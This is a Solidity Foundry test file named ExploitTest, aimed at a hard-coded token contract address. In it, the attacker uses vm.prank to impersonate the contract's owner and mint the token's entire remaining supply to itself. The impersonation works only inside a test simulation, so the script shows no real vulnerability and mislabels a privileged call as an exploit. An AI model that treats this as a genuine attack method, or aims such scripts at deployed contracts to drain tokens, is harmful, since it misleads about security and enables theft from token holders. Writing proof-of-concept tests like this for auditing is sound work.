// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

// Merged the two ISolar interfaces into one.
interface ISolar {
    function mint(address _to, uint256 _amount) external;
    function owner() external view returns (address);
    function totalSupply() external view returns (uint256);
    function getMaxTotalSupply() external pure returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0x04Dd1FcfDd8bDaA30dbB30dC4f61F5a5d50D7bE8;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup required
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Get the maximum and current total supply from the contract
                uint256 maxSupply = ISolar(TARGET).getMaxTotalSupply();
                uint256 currentSupply = ISolar(TARGET).totalSupply();

                // Calculate the exact remaining amount that can be minted
                uint256 mintAmount = maxSupply - currentSupply;

                // Get the current owner of the contract
                address owner = ISolar(TARGET).owner();

                // Impersonate the owner to call the mint function
                vm.prank(owner);

                // As the impersonated owner, mint the remaining tokens to the attacker
                ISolar(TARGET).mint(attacker, mintAmount);
    }






    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
